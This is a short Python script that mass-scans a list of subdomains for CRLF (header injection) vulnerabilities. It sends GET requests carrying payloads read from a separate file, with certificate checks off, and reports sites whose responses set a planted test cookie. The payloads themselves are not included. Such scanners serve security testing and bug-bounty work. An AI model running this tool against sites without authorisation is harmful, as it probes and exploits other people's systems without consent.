import requests
import urllib3

# please use python 3.7
# This script only test CRLF vulnerabilities on GET commands and
# should create Set-Cookie:mycookie=myvalue header if vulnerable

PAYLOADS = "payload_crlf.payload"
SITELIST = "sitelist.txt"

# protocol either 'http://' or 'https://'
def crlf(protocol, subdomain):
    urllib3.disable_warnings()
    with open(PAYLOADS, "r") as file_payload:
        for payload in file_payload:
            payload = payload.replace("\n","")
            try:
                print("[-] Trying payload:" + payload)
                r = requests.get("%s%s/%s" % (protocol, subdomain, payload), verify=False, timeout=1, allow_redirects=False)
                for name in r.cookies.keys():
                    if "mycookie" in name:
                        print("[+] Vulnerable: %s%s/%s" % (protocol, subdomain, payload) )
            except requests.Timeout:
                print("\t[!] Timeout")
                return False
            except Exception as e:
                print("\t[!] ERROR STRING: %s%s:443/%s" % (protocol, subdomain, payload) )
                print(str(e))

if __name__ == "__main__":
    with open(SITELIST, "r") as f:
        for subdomain in f:
            subdomain = subdomain.replace("\n","")
            print("[-] Domain: " + subdomain)
            crlf("https://", subdomain)
            print("[-]\n")